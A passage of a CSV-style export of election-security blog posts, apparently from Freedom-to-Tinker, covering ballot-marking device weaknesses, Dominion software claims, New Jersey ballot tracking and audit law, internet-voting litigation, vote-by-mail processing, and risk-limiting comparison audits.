could simply leave that line blank–then, when the voter has reviewed the ballot (or not bothered to), the ballot card is pulled past the printhead into the ballot box, and the printhead (under control of hacked software) can print in a vote for Candidate Smith. Few voters will be worried that the line is blank rather than filled in with NO SELECTION MADE. You might think, “OK, the ExpressVote XL can fill in undervotes, that’s bad, but it can’t change votes.” But it can! Here is the mechanism: Suppose the voter makes choices in all 15 contests, and chooses Jones for State Senator. The hacked software can print a ballot card with only 14 contests, and leave blank spaces for State Senator. Then, after the voter reviews the ballot card behind glass, the card moves past the printhead into the ballot box. At this time the hacked software can print the hacker’s choice (Smith) for State Senator. If most humans were really good at checking their printout line-by-line with what they marked on the touchscreen, this wouldn’t succeed because the voter would notice the missing line, but voters are only human. More details and explanation are in the paper*. * Ballot-Marking Devices Cannot Assure the Will of the Voters, by Andrew W. Appel, Richard A. DeMillo, and Philip B. Stark. Election Law Journal, vol. 19 no. 3, pp. 432-450, September 2020. Non-paywall version, differs in formatting and pagination."
"339","2020-11-13","2023-03-24","https://freedom-to-tinker.com/2020/11/13/did-sean-hannity-misquote-me/","Mostly, I was quoted accurately, although the segment confuses a few different Dominion voting systems with each other. And vulnerabilities are not the same as rigged elections, especially when we have paper ballots in almost all the states. On November 13, 2020, Fox News aired a segment by Sean Hannity, “A deep dive into the voting machines at center of controversy“, in which he pointed out problems with Dominion voting machines in Michigan and Georgia. He quoted from my 2018 Freedom-to-Tinker article Design flaw in Dominion ImageCast Evolution voting machine and from my 2018 testimony before the House Subcommitee on Information Technology. The quotes are accurate, although slightly out of context. The Dominion systems in Michigan and Georgia are not the ImageCast Evolution that has that design flaw. My Congressional testimony is that all voting machines can be hacked, and that’s true. My testimony about replacing the software in 7 minutes with a screwdriver refers to an older Dominion voting machine, used in New Jersey (though not this year because of the pandemic), but not used in Michigan and Georgia. But it’s still true that, one way or another, the software in any voting machine can be (fraudulently) replaced — in any voting machine used in any of the 50 states. Regarding Antrim County, Michigan: Dominion’s election-management software is badly designed: when uploading results from a voting machine to the central server, the software keeps track of votes by ballot position, with no check on candidate name. So if there’s a last-minute revision to the ballot design used in the voting machine, but the ballot-design file on the server is not updated, then votes for Trump may be mistakenly uploaded as votes for Biden. Dominion calls that “human error.” I call it, bad software design that fails to make consistency checks on its input. Fortunately, Antrim County has hand-marked paper ballots (counted by those Dominion optical-scan voting machines) that can be audited by hand, and other forms of paper trail, so Antrim County was able to correct its error and report accurate vote totals. Mr. Hannity proposes a solution: “If we want to have as a country, election results with integrity, that the people of this country will have confidence in, we can easily and absolutely have a system forensically checked–and by the way, I’ll even argue, allowing both Republican and Democratic engineers to do the forensic check together.” That’s a well-intentioned idea, but it does not really solve the problem. Yes, absolutely the source code and software of voting machines should be made public so that citizens of any party can examine it for design mistakes. But what happens if the voting machine is hacked after that examination? The U.S. mostly uses paper ballots now, and that’s how we can trust the election results even though there are some computer vulnerabilities. The best solution is to use paper ballots, marked by hand, counted by computers, and recountable by hand. Those computers might be hacked, but the ballots personally marked by the voters are the same pieces of paper that can be recounted by humans. That’s what Michigan does, along with more than 40 other states. That is the state-of-the-art most-secure-known way of conducting elections. Georgia, on the other hand, uses touch-screen ballot-marking devices to mark the ballots, which are then counted by optical scanners and recountable by hand. If the optical scanners are hacked, then a recount will detect and correct the problem. But if the touch-screens are hacked, then (on a small fraction of the ballots) they can print the wrong vote on to the ballot. The recount can’t detect and correct that hack, because it can only see what’s printed on the ballots. Still, hacks and glitches in the election-management computers, in the optical scanners, and in other parts of the system have been detected and corrected by audits and examination of those paper ballots."
"340","2020-11-11","2023-03-24","https://freedom-to-tinker.com/2020/11/11/new-jersey-gets-ballot-tracking-only-half-right/","Two months before the November 2020 election, I wrote about New Jersey’s plans for an almost-all-vote-by-mail election. What I was told by one county’s Administrator of Elections was, New this year is ballot tracking offered on the NJ Division of Elections’ website. The tracking numbers are not USPS tracking–they can’t tell you where inside the U.S. mail your ballot is–but the tracking system can tell the voter: when the County Clerk cleared the absentee ballot for mailing to the voter; when it was received back from the voter by the BoE; whether the ballot was accepted or not. (September 12, 2020) This makes a lot of sense. The voter would like to know whether their signature was accepted–or whether they forgot to sign it at all–so they can “cure” their ballot, or vote in person with a provisional ballot. The tracking system allows voters to look this up online. (The outer ballot-return envelope is preprinted with a bar code identifying the voter, so even if the voter forgot the inner envelope or improperly removed the “DO NOT REMOVE” certificate from the inner envelope, the tracking system has this information for the voter.) Unfortunately, the State Division of Elections disabled this important feature of the tracking system. When I log in to track-my-ballot, the following message appears: Due to historically high volume, ballots deposited in Secure Ballot Drop Box locations may take up to one week to show up as “Received” and Ballots sent via US Mail may take up to two weeks to show up as “Received” in the Track My Ballot tool. Ballot status information (i.e. – received, etc.) is provided by the counties via an automated process. The amount of time it takes until updates post to the Track My Ballot tool may vary from county to county. A voter’s ballot status won’t be changed to “Accepted” or “Rejected” until after the certification of the Election, on November 20th. Please check back periodically for updates to your ballot status.(viewed November 10, 2020) The first paragraph–a delay in processing the signatures at local elections offices–is forgivable this year. But the second paragraph–intentionally withholding information from the voters until it’s too late about whether their ballot was accepted–is a deliberate policy decision by New Jersey Division of Elections, and it’s the wrong decision. It makes the tracking system practically useless to the voter."
"341","2020-10-13","2023-03-24","https://freedom-to-tinker.com/2020/10/13/federal-judge-denies-injunction-so-7-states-wont-be-forced-to-accept-internet-ballot-return/","In the case of Harley v. Kosinski, Matthew Harley (and 9 other individuals) sued the election officials of 7 states (New York, Pennsylvania, Ohio, Texas, Kentucky, Wisconsin, and Georgia). The Plaintiffs, U.S. citizens living abroad, said that voting by mail (from abroad) has become so slow and unreliable that these states should be forced to let them vote by internet. The lawsuit was filed September 30, 2020, requesting a preliminary injunction requiring online ballot return. The state defendants responded in writing by (the Court’s deadline of) October 9. On October 13, Federal district judge Brian Cogan denied the plaintiffs’ motion for a preliminary injunction. Each of the seven states filed a reply brief arguing (as usual for preliminary injunctions) that the plaintiffs lack standing, they’re suing the wrong parties, they have not established a clear likelihood of success on the merits, and they have not demonstrated irreparable harm. I will summarize New York State’s reply brief; the other states made similar arguments. Lack of standing: the New-York-resident plaintiff “cannot establish an injury in fact that is traceable to any challenged conduct of the New York State Defendants”. Mr. Harley is “concerned” that his completed ballot will not be received on time. It was mailed to him on September 18, but he does not say when he received it or when he mailed it back. His “concern” is not an “actual” or “imminent” injury. Sued the wrong parties: Election officials are just following state law, which does not provide them the discretion to permit internet ballot return. Go sue the post office. No likelihood of success on the merits: it serves a compelling state interest to avoid internet voting: The secret ballot is a compelling state interest, to protect voters from intimidation and (vote-buying) fraud. Internet voting cannot protect the secrecy of the ballot. The security of the voting process is a compelling state interest. “As set forth in the Declarations of Professor Appel, Susan Greenhalgh, Barbara Simons, and David Jefferson . . . there is a broad consensus within the scientific community that the return of ballots via the internet or by fax is not secure and creates a high-risk threat to the integrity of the election process and should not be used in voting now or in the foreseeable future.” No demonstration of irreparable harm: “the speculative harms identified by … Mr. Harley [and the other N.Y. plaintiff] are partially self-imposed. Their ballots were emailed to each of them in September, but they have yet to mail them back … because of their subjective “concerns”. Well, indeed, I would be concerned too. Mail service is slower this year, and it may be true (as plaintiffs allege) that international mail is even slower and less reliable. But allowing internet voting–which can be hacked from anywhere and everywhere–cannot be the solution. To reason that “we really want this, so there must be some way to make it secure” is magical thinking. My own declaration played a (very small) role in this; it was filed by New York in support of their reply brief that I have summarized above. Judge Cogan explained his ruling as follows (paraphrase): Second Circuit case law imposes a very high hurdle for a preliminary injunction that imposes a mandate on state government. There must be a strong showing of irreparable harm and a clear showing of likely success on the merits. Plaintiffs could not show jurisdiction over the six states other than New York. That mail might pass through the JFK International Processing Center was not a sufficient basis for jurisdiction. Plaintiffs could not show standing because none showed an injury in fact, only a speculative chain of possibility. Judge Cogan referred to the Purcell principle, that courts must be extremely cautious before granting injunctive relief on the eve of an election. The US Constitution does not guarantee overseas voters the right to vote and overseas voters do not have a constitutional right to a particular method for returning a ballot beyond what Congress authorized in UOCAVA. Voters do not take their right to vote with them when they move abroad. A change this close to the election would undermine voter confidence in the system. States need time to set up systems. He acknowledged potential security risks, which have a significant effect on voters’ confidence in the system. Recent problems that New York experienced implementing expansion of absentee voting underscore the concern that any court-ordered changes could be difficult to implement. A few hours after the Court denied the preliminary injunction, the Plaintiffs moved to dismiss the case, without prejudice. So I guess that’s that."
"342","2020-09-20","2023-03-24","https://freedom-to-tinker.com/2020/09/20/vote-by-mail-meltdowns-in-2020/","If your state is voting by mail, then you can’t process all the ballot envelopes on November 3rd — it’s just too labor-intensive. The details vary by state, as every state has different laws, but (basically) for each mail-in ballot received by the county election clerk, they must: Sort the envelopes by “ballot style” (municipality or district) [CA and some other states don’t need to sort] Look up the voter’s information (written on the envelope) in the voter-registration database (to find the signature for comparison, and to record in the database that the voter has voted, so therefore can’t vote twice) Compare the signature and accept or reject the envelope Remove identifying information from the envelope (to ensure the votes cannot be connected to the voter when the envelope is opened); in NJ it’s on a tear-off perforated tab Open the envelope; check that the ballot type is right for the municipality or district If the ballot is deemed unscannable, remake (copy by hand) the ballot Flatten the ballot and put it in the batch for high-speed scanning+counting Run the batch through the optical scanner States that (usually) vote in-person, with just a few absentee ballots per county, can do all this processing on election day. States that vote mostly by mail need to do all the labor-intensive parts (that is, all but running through the scanner) well in advance of election day — it is many days of work. Running through the scanner can perhaps be saved for election day (or the days immediately before), because the scanners can process 75 or 300 ballots per minute. So therefore, vote-by-mail (or mostly-vote-by-mail) states such as OR, UT, CO, HI, WA have developed (over the years) procedures to process vote-by-mail envelopes in a timely way, as the ballots arrive in the weeks before the election. Some states that are mailing ballots to all voters just for the COVID-19 pandemic this year include NJ, CA, NV — and these states have adjusted their laws to allow processing the envelopes in the weeks before November 3rd. That makes sense. Some states are sticking with in-person voting, but they allow processing of absentee ballots in a timely way (before November 2nd). That should be OK. Indeed, it is OK, as well as AK, AR, AZ, FL, GA, ID, IN, KS, ME, MN, MO, NC, NH, TN, TX, VT. Some states are encouraging vote-by-mail — that is, they are mailing absentee-ballot request forms to every voter, while also planning for in-person voting. The states that are doing this (with timely processing of absentee ballot envelopes before November 2nd) are CT, DE, IA, IL, MD, MA, NE, OH, RI. Signature cure: There’s another advantage to processing ballot-envelopes early. In many (but not all) of these states, if a voter’s signature does not match (or is missing), there’s time to contact the voter and let the voter fix the problem so the vote can count. If you process the signatures only on November 2nd or 3rd, that’s not possible. Potential election meltdown states Several states are sticking with in-person voting this year, and (as usual) planning to process all their absentee ballots on November 3rd or November 2nd. That will be OK, unless they experience a much greater rate of absentee ballots than usual. If a state is accustomed to 5% of the voters requesting (and returning) absentee ballots, and they get 40%, then it may take them several days after November 3rd to finish counting the votes. These states include AL, KY, LA, MS, NY, ND, PA, SC, SD, WV, WY. Experts are particularly concerned about PA based on experience in the primary; and because of the late adoption of procedural changes, delayed by lawsuits that have only just been resolved. Voters in these states should strongly consider taking this advice: vote in person. Probable election meltdown states What would be really dysfunctional would be to encourage vote-by-mail, but then to wait until November 3 (or November 2) to start processing those envelopes. That’s a recipe for election meltdown. The states that are heading for this disaster are MI, VT, WI. Iowa, Michigan, and Wisconsin are mailing absentee-ballot-request forms to every voter; but waiting until the last minute to process them after they’re returned. Vermont is even worse: the state is mailing a ballot to every voter, but won’t start processing the returned envelopes until November 2nd. The Michigan State Senate recently approved a bill to start processing on November 2nd instead of November 3rd. If passed into law, that’s better than nothing — it will certainly help — but it may turn out to be inadequate. Voters in these states should strongly consider taking this advice: vote in person. Late ballot arrival states Some states will count ballots postmarked by November 3rd, as long as they arrive by November 5th, or November 10th, etc. (depending on the state). (And the post office doesn’t “postmark” prepaid “business reply mail”, but can provide other evidence of when it was mailed, so states should be careful about how they use the word “postmark.”) AK, CA, DC, IL, IA, KS, MD, MN, MS, NV, NJ, NY, NC, ND, OH, PA, TX, VA, WA, WV. In these states, final election results cannot be known until several days after the election. If the late-arriving ballots are more for one candidate than another, this will cause an apparent shift in election results. That’s a meltdown of a different kind. No-late-ballot-arrival states Several states do not accept ballots that arrive after election day, even if postmarked before the deadline. If the postal service is unusually slow this year, then these states may disenfranchise many voters: AL, AZ, AK, CO, CT, DE, FL, GA, HI, ID, IN, KY, LA, ME, MA, MI, MN, MO, MT, NE, NH, NM, OK, OR, PA, RI, SC, SD, TN, VT, WI, WY. I’m not saying which is the right or wrong answer: accept ballots past November 3rd (if postmarked by the state-set deadline) and suffer from delays in reporting results; or stop accept ballots November 3rd and disenfranchise voters. Pick your poison. A compromise in the middle is to accept absentee ballots dropped off in drop boxes, vote centers, and polling places, as several (but not all) states do. Polling-place meltdown states So far, I’ve just been talking about the processing of absentee ballots. But some states and cities, in the past, have experienced hours-long lines at polling places, because of (1) underprovisioning of touch-screen voting machines, or (2) voting machines (or e-pollbooks) failing to turn on in the morning, or both at once. Famous examples include Cleveland in 2004, and Atlanta in 2020 (primary election). Not coincidentally, both of these cities used touch-screen voting machines–because those are expensive (and slow to vote on), this can lead to underprovisioning of machines compared to how many voters there are. In contrast, states that use hand-marked paper ballots can (usually) provide enough pens and enough cardboard privacy screens for many voters. The challenge, this year, will be to do this while also social distancing. Let’s hope that the in-person voting states, this year, can avoid meltdowns (long lines, or COVID transmission) at their polling places. The data from this article came, in part, from the National Conference of State Legislatures (and this NCSL page too). [edited 9/22/20: MN is a late-ballot-arrival state]"
"343","2020-09-16","2023-03-24","https://freedom-to-tinker.com/2020/09/16/election-audits-in-nj-2020/","It has been well understood for more than 15 years that computerized voting machines can be hacked to make them cheat (or might be misconfigured by accident), and therefore it is essential to have random audits of the ballots. That is: Human inspection of paper ballots that the voters marked, of a random sample of the ballots or ballot-boxes (batches); so that if the computers had been hacked (or misconfigured) to produce the wrong outcome, there is a good chance (statistically speaking) of catching and correcting the error. New Jersey’s Legislature passed such an audit law in 2007, shortly after they passed a law requiring paper ballots. The paper ballot law was “suspended” in 2008–most counties still use paperless touchscreen voting machines–but the audit law remains in force. So, New Jersey’s law requires the audits of paper ballots that don’t exist. In 2019, things started to change: three or four counties purchased voting machines with a paper trail, and the Division of Elections (correctly) determined that those counties must perform audits. The gold standard for election audits is the Risk-Limiting Audit, a class of methods that combines high assurance with high efficiency. New Jersey’s law does not prescribe RLAs, because back in 2007 those were not well understood. New Jersey’s audit law was pretty good for its time, but RLAs are more effective and it would be a good idea to update the law. In 2019, the Division of Elections did some “pilot audits,” using the RLA method on three or four county-level elections in those counties that had paper-ballot equipment. These were for the purpose of training local election administrators in how RLAs work, learning about the process, adapting RLAs to New Jersey’s equipment and regulations, and so on. In 2020, things changed a lot more: the November 2020 general election will be conducted almost entirely with hand-marked paper ballots, as a public-health measure during the COVID-19 pandemic. The vast majority of ballots will be mail-in ballots (that can returned, in their signed envelopes, either by U.S. mail, in county drop-boxes, or at polling places). Voters who wish to may vote in-person on November 3rd at a polling place, using a provisional ballot (also a hand-marked paper ballot). (Provisional, to give election administrators the ability to ensure that nobody votes by mail and in person.) A tiny proportion of votes will be on paperless DREs that have disability accommodations, for voters who cannot mark a paper ballot and do not wish to vote with assistance on a paper ballot. So, for the first time in more than a century, New Jersey will have a (practically) all-paper-ballot election, and you might think that the 2007 audit law will finally come into force. And apparently the Governor thinks so as well! Governor Phil Murphy’s Executive Order 177, dated August 14th (in the 245th year of the Independence of the United States) outlines the many emergency procedures that will accommodate this year’s election to the pandemic. Some of the more major components of this EO were (2 weeks later) passed as laws by the Legislature. Among the provisions of the Order are that “to allow enough time for results to be certified prior to the meeting of electors, N.J.S.A. 19:61-9(c)(8) is suspended, and counties may certify their election results prior to the commencement of the election audit required in N.J.S.A. 19:61-9.” That is, normally the audit must be complete before election results are certified. (This is essential, to make audits meaningful.) This year, that deadline is suspended. But the rest of the Audit statute is not suspended, including, “Within a reasonable period of time after the final vote count after an election, the Attorney General, with the audit team, shall determine and then announce publicly the election districts in the State in which audits shall be conducted, and within 24 hours of that announcement, the audit shall be commenced.” That is, the audit must be commenced “within a reasonable period of time.” Certification of election results must be done by November 20th, in part so that New Jersey can meet its Federal “safe harbor” deadline of December 8th to choose Electors. Because of the unprecedented (for New Jersey) all-by-mail-and-provisional-ballot election, county election officials may need all of those days between November 3rd and November 19th to finish counting the votes, and may not have time to do audits before November 20th. The Secretary of State has informed county election officials that the audits shall take place between November 23 and December 4. Normally I would like to see the audits completed before results are certified, as the law requires. But this seems like a reasonable compromise in light of the pandemic. Completing the audits by December 4th means: If the audit uncovered anything drastically wrong in the Presidential election, there’s still time to do something before December 8th. If the audit uncovered anything drastically wrong in any other election, there are several weeks before Inauguration day (for Congressional offices), and recounts can be done. New Jersey’s audit law could still use some updating, but audits using the current law are far better than no audits. I hope that in future years, New Jersey continues to use all-hand-marked paper ballots; that in future years, the timetable for counting votes allows audits before certification as the law requires; and that (based on experience with statutory audits and pilot RLAs) the Division of Elections recommends to the Legislature that the law be updated to more modern methods. And one more thing: The statute requires that the chief election official shall appoint an independent audit team to design the audit, and the “procedures and assumptions shall be published prior to any given election, and the public shall have the opportunity to comment thereon.” If the audit team has been appointed, I urge them to comply with the law and publish their procedures soon."
"344","2020-06-20","2023-03-24","https://freedom-to-tinker.com/2020/06/20/nj-agrees-no-internet-voting-in-july-vague-about-november/","A formal settlement agreement has been submitted to the NJ Superior Court regarding online ballot access in the 2020 elections. On May 4, 2020, New Jersey’s Division of Elections was caught trying to adopt vote-by-Internet on the stealth, even though the law forbids it. That is, not only is Internet voting inherently insecurable, there’s a 2010 Court Order still in effect that says, “computers utilized for election-related duties shall at no time be connected to the Internet.” That’s based on the New Jersey Superior Court’s finding that “As long as computers, dedicated to handling election matters, are connected to the Internet, the safety and security of our voting systems are in jeopardy,” in the case of Gusciora v. Corzine. Penny Venetis, attorney for the Gusciora plaintiffs, filed a motion (in early May) with the Court, to make the State abandon its plans for online voting, on the basis that receiving ballots e-mailed or uploaded on the Internet clearly violates this order. The Court ordered the parties to reach a settlement by June 8, or report their separate positions. The State’s initial position was that they would use Democracy Live’s “OmniBallot” online voting system, that permits the voter to choose (1) ballot download (for printing and marking at home), (2) ballot download and mark-on-home-computer (for the voter to print and physically mail), or (3) ballot upload through Democracy Live’s portal. Democracy Live’s voting system is insecure in all sorts of unsurprising and surprising ways. Even so, the State proposed to use this for disabled voters, overseas and military voters, and, basically, any voter who wanted to use it. Doing so would leave New Jersey’s 2020 election extremely insecure. Plaintiffs’ position was that (1) ballot download has several security problems and should therefore be limited to voters who absolutely need it, specifically, voters with disabilities and military/overseas voters; (2) computerized ballot marking has even more security problems and should be limited to voters with disabilities that prevent them from hand-marking a paper ballot; (3) no votes should be transmitted over the internet; and (4) if the State is outsourcing ballot-delivery services to private companies, then those companies should not snarf and resell all sorts of personal information about voters and their browser-fingerprints. The parties did reach a compromise settlement; in mid-June they agreed: An “electronic ballot access or delivery system” may be used only for public health purposes during the July 2020 primary and November 2020 general election, only for voters with disabilities and military/overseas voters. Unvoted ballots may be electronically delivered to those voters. Voters with disabilities may print the unvoted ballot for hand marking and return by U.S. mail or other nonelectronic means; the military or overseas voters may print the ballot for hand marking and then return it by the means specified for them in New Jersey law (N.J.S.A. 19:59). A voter with a disability who is unable to mark a ballot by hand may be given the choice to use accessible technology to indicate vote selections on the computer, then print and mail (or otherwise physically return) the paper ballot. Voters’ ballot selections (votes) are never to be transmitted over the internet. No personal voter information (or information about the voter’s computer or browser) may be gathered, analyzed, or sold. The State will follow these rules (and write them into vendor contracts) for the July primary. If the State contemplates using any system in November that does not satisfy these criteria, the State must notify the Plaintiffs no later than August 21st — and if they do so, the schedule is laid out for Plaintiffs and the State to file briefs in whatever lawsuit might ensue. Although the State didn’t tell us until much later, on May 28th they put out a Request for Bids for a system satisfying our criteria; by June 7th they had already selected a vendor (Voting Works) whose product looks a lot more respectful, compared to Democracy Live, of basic election security principles and voters’ privacy (based on the bid document that Voting Works sent to the State, and on an interview with an executive at Voting Works). Even so, during the settlement negotiations in early June the State vigorously resisted admitting that Internet voting is not permitted by New Jersey law. That’s even though: New Jersey statutes clearly enumerate what kinds of voting systems are permissible, and Internet voting is not among them; the statutes clearly lay out the certification requirements for voting systems, and Internet voting is not certified; and the Court Order pretty clearly says that voting systems are not to be connected to the Internet. Based on the compromise agreement, at least this time the State can’t covertly adopt Internet voting. If the State notifies Prof. Venetis on August 21 that they’re planning to use some sort of on-line voting system that does not satisfy the criteria enumerated above, then she will seek a court order to prevent any internet-based system from being used. Based on the language of the court’s 2010 order “computers utilized for election-related duties shall at no time be connected to the Internet” and the court’s 2010 opinion (quoted in the first paragraph above), the State will have an uphill battle defending an internet-based voting system."
"345","2020-04-10","2023-03-24","https://freedom-to-tinker.com/2020/04/10/can-legislatures-safely-vote-by-internet/","It is a well understood scientific fact that Internet voting in public elections is not securable: “the Internet should not be used for the return of marked ballots. … [N]o known technology guarantees the secrecy, security, and verifiability of a marked ballot transmitted over the Internet.“ But can legislatures (city councils, county boards, or the U.S. Congress) safely vote by Internet? Perhaps they can. To understand why, let’s examine two important differences between legislature votes and public elections: Public elections require the secret ballot; legislatures can vote by public roll-call vote. Internet voting requires digital credentials; the U.S. has no effective way to distribute digital credentials to the public, but it is feasible to provide credentials to members of a legislature. The cyberthreats facing any kind of Internet voting include: (A) hackers impersonating a voter, (B) hackers exploiting server vulnerabilities to fraudulently change the software that counts votes, (C) hackers exploiting (voter’s phones and laptops) client vulnerabilities to fraudulently change the software that transmits votes, and (D) Other attacks, such as denial of service: prevent some legislators from acccessing the Internet. (Blockchain can’t solve these problems; see pages 103-105 ) But suppose a legislative body wished to avoid meeting in person during a pandemic. Could these threats be mitigated sufficiently? (A) It is feasible to distribute security tokens to the 15 members of a county commission or the 435 members of the House of Representatives, in a way that’s not feasible for 235 million registered voters. Even without security tokens, a Member who is personally known to the clerk of the legislature could vote by video chat, in an emergency. (Caveats: Security tokens are highly secure but not perfect; video chat could be subject to deep fakes; but see below for mitigations.) (B,C) Attacks that compromise the client or server computers can be detected and corrected, if everyone’s vote is displayed on a “public bulletin board.” That is, each member of the legislature would transmit his or her vote, then must check the public roll-call display to make sure the vote was reported and recorded accurately. Checking the public roll-call display isn’t so simple, since hackers could alter the member’s client device (e.g., laptop computer or phone) to make it lie about what’s downloaded from the roll-call display. A Member should check the roll-call from a variety of devices in a variety of locations, or (perhaps) coordinate with other Members to make sure they’re getting a consistent report. This remote workaround would not be simple and easy. Careful protocols must be designed to limit the amount of time for members to contest their vote; one must consider what happens if Members game the system (by falsely claiming their vote was altered); one must consider what happens if lobbyists are literally sitting next to the member during voting (which is less likely when the member is gathered in a public place for a traditional vote). What do the legislatures quorum rules mean in this context? And many legislatures prefer to take many votes by “voice vote” where each member’s individual vote is not recorded. And just because Internet roll-call votes may be feasible to secure, that doesn’t mean they’re automatically a good idea, or legal: see this report by the Majority staff of the House of Representatives. Conclusion: we know that Internet voting by the public is impossible to secure, and thus we must not vote by Internet even during the COVID-19 epidemic. But Internet voting by legislatures is not necessarily impossible to secure, and could reasonably be considered. If legislative bodies desire to meet and vote remotely, there is still plenty of work to do to actually secure the process. And that’s difficult to do in a hurry."
"346","2020-03-13","2023-03-24","https://freedom-to-tinker.com/2020/03/13/ballot-level-comparison-audits-bmd/","In my previous posts, I’ve been discussing ballot-level comparison audits, a form of risk-limiting audit. Ballots are imprinted with serial numbers (after they leave the voter’s hands); during the audit, a person must find a particular numbered ballot in a batch of a thousand (more or less). With CCOS (central-count optical scan) this works fine: the CCOS prints the serial numbers consecutively, and the human auditor can easily find the right ballot in a minute or two. With PCOS (precinct-count optical scan), we are reluctant to print the serial numbers consecutively, because the order in which people insert their ballots at the polling place is visible to the public, and (in theory) someone could learn how you voted by correlating with the CVR file. What about ballot-marking devices (BMDs)? How do the serial numbers work for use in ballot-level comparison audits? First of all, let’s remember that RLAs of BMD-marked ballots are not very meaningful, because the RLA can only assure that what’s marked on the paper is correctly tabulated. Because most voters don’t inspect what’s marked on the paper, the RLA cannot assure that what the voter indicated to the BMD (on the touchscreen) has been correctly tabulated, if the BMD had been hacked to make it cheat. But suppose we set that concern aside. And indeed, some jurisdictions are conducting “RLAs” on BMD-marked ballots. So let’s examine how such “RLAs” should work. If the BMD prints a serial number onto the marked ballot before presenting the ballot for the voter to examine, then the voter can see the serial number, and can make a note of it. Then the voter can sell their vote, by telling the criminal vote-buyer the serial number. Or the voter can be coerced to do so. You may think this is a far-fetched scenario, but voter coercion and vote selling were common in the 19th-century and early 20th-century United States, and occurs now in some other countries. Some “all-in-one” BMDs incorporate a scanning function, and don’t require a separate PCOS scanner. Suppose such a BMD prints a serial number onto the marked ballot after presenting the ballot for the voter to examine? That helps address the “voter-sees-the-number” problem. But it’s unpleasant to contemplate voting machines that can mark your ballot after the last time you see it. Any voting machine whose physical hardware can print votes onto the ballot after the last time the voter sees the paper, is not a voter verified paper ballot system, and is not acceptable. But even so–suppose we permit this–we are in a similar situation to PCOS ballots. That is, the serial numbers should be in random order, not consecutive order, because otherwise observers in the polling place could calculate what serial number you’ll get. And therefore, ballot-comparison audits of BMD-marked ballots run into just the same problem as audits of PCOS-scanned ballots, and maybe the same solutions would apply. Because of this problem, some manufacturers of BMDs have done the same as manufacturers of PCOS: omit serial numbers entirely. For example, the ExpressVote and ExpressVote XL do not print serial numbers on the ballot*, and therefore their ballots (like PCOS ballots) cannot be easily audited by ballot-level comparison audits (except by a cumbersome “transitive audit”). *Based on information about the ExpressVote and ExpressVote XL as configured in 2019 and deployed in more than one state, including New Jersey."
"347","2020-03-04","2023-03-24","https://freedom-to-tinker.com/2020/03/04/ballot-level-comparison-audits-central-count/","All voting machines these days are computers, and any voting machine that is a computer can be hacked to cheat. The widely accepted solution is to use voting machines to count paper ballots, and do Risk-Limiting Audits: random-sample inspections of those paper ballots to ensure (with a guaranteed level of assurance) that the election outcome claimed by the computers is the same as you’d get by an accurate count of the votes actually marked on the paper ballots. An RLA is any statistical/logistical method that guarantees a quantifiable risk limit. Most RLA methods are much more efficient than a full recount, but some RLA methods are more efficient than others, especially in close elections: the closer the margin of victory, the more ballots you have to random-sample to guarantee the risk limit. One simple method, the Ballot Polling Audit, randomly samples individual ballots from among all the batches of ballots in the entire election, and (by human inspection of the paper ballot) counts how many are for each candidate. If you sample enough ballots, and that “poll” comes out the same way as the outcome claimed by the voting machines, then you get real assurance. (If the “poll” doesn’t come out the same way, you can do a bigger poll or a full hand recount.) If the margin of victory is large (60/40 or even 55/45), then a Ballot Polling Audit may need to sample only a few hundred ballots, even if a million votes were cast. But if the margin is closer than 1% then a BPA may need to sample tens of thousands of ballots, or in some cases over a hundred thousand. A more high-tech RLA, the Ballot-level Comparison Audit, can be much more efficient. The optical-scan voting machine must print onto each ballot a unique serial number;* it must produce an electronic data file of Cast Vote Records (CVR file) which lists every ballot, with its serial number and exactly which votes are claimed to be on the corresponding physical paper ballot. The the audit consists of: add up the CVR file to check the outcome, sort the CVR file to make sure there are no duplicate serial numbers, and take a small random sample of serial numbers from the CVR file, find the corresponding physical paper ballots, and make sure the CVR file makes an accurate claim about what’s on the paper. And even if the margin is close, checking just a few hundred ballots can give very high confidence. *This can be done without printed serial numbers; see below for an alternate method. The voter should not see the serial number–otherwise there is no “secret ballot”, and voters could be bribed or coerced to vote a certain way. Therefore, the optical-scan voting machine should print the serial number onto the ballot after the voter last sees the ballot. Because that optical-scan voting machine could itself be hacked, it’s essential to ensure that the serial-number printer is physically incapable of printing votes onto the ballot, even if the machine’s software is entirely replace. That’s not hard: an optical scanner can be outfitted with a tiny printer that can print only in the left-hand 1-centimeter margin of the paper, so it can’t possibly print votes beyond the margin. Here’s an example; the serial number at lower-left was added by the optical scanner: Modern Central-Count Optical Scan (CCOS) voting machines from several vendors have this essential capability: print a unique serial number onto each ballot as it is scanned, and record that number in the CVR file. Therefore, jurisdictions that use central-count optical scan can already do efficient RLAs, and some jurisdictions are already doing them. Ballot-comparison audits have also been done with CCOS equipment that does not print serial numbers. They rely on the fact that the CCOS scanner preserves the exact order of a batch of ballot papers. Ballots are divided into small batches (such as 200 sheets) for scanning. Based on the CVR file, the human auditor may be instructed to find the 119th sheet in the batch. Central-count optical scan is used for mail-in ballots, and for ballots marked in polling places where the voters deposit ballots in ballot boxes for transport to a central location where a high-speed CCOS machine tabulates them. But many jurisdictions use Precinct-Count Optical Scan (PCOS): voters mark their ballots and insert them directly into a scanner that scans the ballot, tabulates the votes, and deposits the ballot into a ballot box (preserving it for later audits and recounts). In such systems, the story about serial numbers and ballot-level comparison audits is more complicated, as I will describe in the next article."
"348","2020-03-06","2023-03-24","https://freedom-to-tinker.com/2020/03/06/ballot-level-comparison-audits-precinct-count/","Special bonus: This article contains two puzzles for the reader, marked in green. Try to solve them yourself before reading the solutions in a future post! In my last post I described a particularly efficient kind of risk-limiting audit (RLA) of election results: ballot-level comparison audits, which rely on a unique serial number on every ballot. The serial number should not be preprinted on the ballot where the voter can learn it, otherwise the voter could sell their vote, or be coerced to vote a certain way, and the buyer or coercer could learn the vote from the file of cast-vote records (CVRs). The solution, when central-count optical scan (CCOS) is used, is that the central-count optical-scan voting machine can print the serial number onto the ballot, as it scans and counts the ballot. But many jurisdictions use precinct-count optical scan (PCOS): the voter marks a ballot, and feeds it directly into the PCOS voting machine, where it is scanned, counted, and preserved in a ballot box. This has three advantages over CCOS: PCOS machines can alert the voter about overvotes, undervotes, or blank ballots, which gives the voter a chance to correct their ballot. PCOS tabulations are ready immediately at the close of the polls, which gives faster election-night reporting. PCOS tabulations give an additional safeguard against low-tech paper-ballot tampering: if the hand-to-eye recount of this batch does not match the results claimed by the optical-scanner, then one of them is wrong. The paper ballots themselves are the presumed ballot of record; State statutes should say that in case of disagreement we trust the paper by default, not the (possibly hacked or buggy) computers; but even so, a disagreement is important evidence of possible tampering that could be worth a forensic investigation. We don’t get this safeguard with central-count scanning of precinct-marked ballots. But PCOS machines are not equipped with serial-number 